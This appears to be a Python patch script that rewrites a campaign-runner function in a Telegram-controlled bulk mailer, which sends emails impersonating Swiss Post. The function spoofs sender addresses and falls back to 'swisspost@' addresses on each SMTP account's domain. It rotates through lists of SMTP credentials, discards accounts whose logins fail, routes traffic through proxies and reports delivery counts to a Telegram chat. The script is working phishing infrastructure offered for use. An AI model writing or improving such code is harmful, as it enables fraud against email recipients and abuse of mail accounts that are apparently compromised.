#!/usr/bin/env python3
"""Fix: Rewrite _run_swisspost_campaign with proper SMTP retry on failure"""

bot_path = '/opt/darkvasend/auditguard/sender_bot.py'
with open(bot_path, 'r') as f:
    bot = f.read()

# Find and replace the entire _run_swisspost_campaign function
old_start = '# ---------------------------------------------------------------------------\n# Swiss Post Campaign Runner with basique fallback\n# ---------------------------------------------------------------------------\nasync def _run_swisspost_campaign'
old_end = '    mgr.close()\n    proxy_pool.close()\n'

start_idx = bot.find(old_start)
end_idx = bot.find(old_end, start_idx) + len(old_end)

if start_idx == -1:
    print("ERROR: function not found")
    exit(1)

new_func = '''# ---------------------------------------------------------------------------
# Swiss Post Campaign Runner with basique fallback + SMTP retry
# ---------------------------------------------------------------------------
async def _run_swisspost_campaign(campaign_id, db_path, chat_id, mode="spoof"):
    from .campaign_sender import CampaignManager, send_clean
    from .spoof_templates import get_template
    from .proxy_pool import ProxyPool
    from .db import send_telegram

    mgr = CampaignManager(db_path)
    camp = mgr.get_campaign(campaign_id)
    if not camp:
        mgr.close()
        return

    smtp_list = mgr.get_smtp_for_campaign(campaign_id)
    if not smtp_list:
        send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP", chat_id)
        mgr.close()
        return

    mgr.update_campaign_status(campaign_id, "running")

    rate = camp["rate_per_minute"] or 30
    delay = 60.0 / rate

    proxy_pool = ProxyPool(db_path)
    proxy_count = proxy_pool.count_active()

    sent = 0
    failed = 0
    spoof_ok = 0
    basique_ok = 0
    smtp_idx = 0
    start_time = time.time()
    dead_smtps = set()  # Track dead SMTP IDs
    basique_smtps = set()  # Track SMTPs that only work in basique mode

    loop = asyncio.get_event_loop()

    send_telegram(
        "CAMP SWISS POST #" + str(campaign_id) + " LANCEE\\n"
        "Mode: " + mode + " | Rate: " + str(rate) + "/min\\n"
        "SMTP: " + str(len(smtp_list)) + " | Recipients: " + str(camp["total_recipients"]),
        chat_id)

    while True:
        recipient = mgr.claim_recipient(campaign_id)
        if not recipient:
            break

        active_smtp = [s for s in mgr.get_smtp_for_campaign(campaign_id) if s["id"] not in dead_smtps]
        if not active_smtp:
            send_telegram("CAMP #" + str(campaign_id) + ": TOUS SMTP DOWN!", chat_id)
            break

        to_email = recipient["email"]
        proxy = proxy_pool.get_next() if proxy_count > 0 else None
        html_body = camp["letter_html"].replace("{{RECIPIENT_EMAIL}}", to_email)

        from_name = camp["from_name"]
        from_email = camp["from_email"]

        # Try each SMTP until one works for this recipient
        success = False
        used_mode = ""
        last_err = ""

        for attempt in range(len(active_smtp)):
            smtp = active_smtp[(smtp_idx + attempt) % len(active_smtp)]

            if smtp["id"] in dead_smtps:
                continue

            smtp_config = {
                "host": smtp["host"], "port": smtp["port"],
                "username": smtp["username"], "password": smtp["password"],
                "from_email": smtp.get("from_email", "") or smtp["username"],
            }

            # Decide mode for this SMTP
            use_basique = smtp["id"] in basique_smtps

            if use_basique:
                domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
                send_from = "swisspost@" + domain
            else:
                send_from = from_email

            r = await loop.run_in_executor(None, lambda sc=smtp_config, sf=send_from: send_clean(
                sc, from_name, sf, to_email,
                camp["subject"], html_body, camp.get("reply_to", ""), proxy))

            if r["success"]:
                success = True
                used_mode = "basique" if use_basique else "spoof"
                break
            else:
                last_err = r.get("error", "?")
                # AUTH fail = dead
                if "AUTH" in last_err:
                    dead_smtps.add(smtp["id"])
                    mgr.deactivate_smtp(smtp["id"], last_err)
                elif not use_basique and mode == "both":
                    # Spoof failed, try basique with same SMTP
                    domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
                    bas_from = "swisspost@" + domain
                    r2 = await loop.run_in_executor(None, lambda sc=smtp_config, bf=bas_from: send_clean(
                        sc, from_name, bf, to_email,
                        camp["subject"], html_body, camp.get("reply_to", ""), proxy))
                    if r2["success"]:
                        success = True
                        used_mode = "basique"
                        basique_smtps.add(smtp["id"])
                        break
                    else:
                        dead_smtps.add(smtp["id"])
                else:
                    dead_smtps.add(smtp["id"])

        smtp_idx += 1

        if success:
            info = smtp["host"] + " [" + used_mode + "]"
            mgr.mark_sent(recipient["id"], info)
            mgr.increment_smtp_daily(smtp["id"])
            sent += 1
            if used_mode == "basique":
                basique_ok += 1
            else:
                spoof_ok += 1
        else:
            mgr.mark_failed(recipient["id"], last_err, "all_failed")
            failed += 1

        # Progress every 25 sends
        if (sent + failed) % 25 == 0 and (sent + failed) > 0:
            elapsed = time.time() - start_time
            rpm = sent / (elapsed / 60) if elapsed > 0 else 0
            alive = len(active_smtp) - len(dead_smtps)
            send_telegram(
                "CAMP SP #" + str(campaign_id) + "\\n"
                "Sent: " + str(sent) + " (spoof:" + str(spoof_ok) + " bas:" + str(basique_ok) + ")\\n"
                "Failed: " + str(failed) + " | " + str(int(rpm)) + "/min\\n"
                "SMTP alive: " + str(alive), chat_id)

        await asyncio.sleep(delay)

    status = "finished" if not mgr.claim_recipient(campaign_id) else "stopped"
    mgr.update_campaign_status(campaign_id, status)
    elapsed = time.time() - start_time
    stats = mgr.get_stats(campaign_id)
    send_telegram(
        "=============================\\n"
        "  SWISS POST #" + str(campaign_id) + " " + status.upper() + "\\n"
        "=============================\\n"
        "Sent: " + str(stats.sent) + " (spoof:" + str(spoof_ok) + " bas:" + str(basique_ok) + ")\\n"
        "Failed: " + str(stats.failed) + "\\n"
        "Pending: " + str(stats.pending) + "\\n"
        "SMTP dead: " + str(len(dead_smtps)) + "\\n"
        "Time: " + str(int(elapsed)) + "s", chat_id)
    mgr.close()
    proxy_pool.close()

'''

bot = bot[:start_idx] + new_func + bot[end_idx:]

with open(bot_path, 'w') as f:
    f.write(bot)

# Verify
with open(bot_path, 'r') as f:
    final = f.read()
print("_run_swisspost_campaign found:", "_run_swisspost_campaign" in final)
print("send_clean count:", final.count("send_clean"))
print("_send_one count:", final.count("_send_one"))
print("DONE")
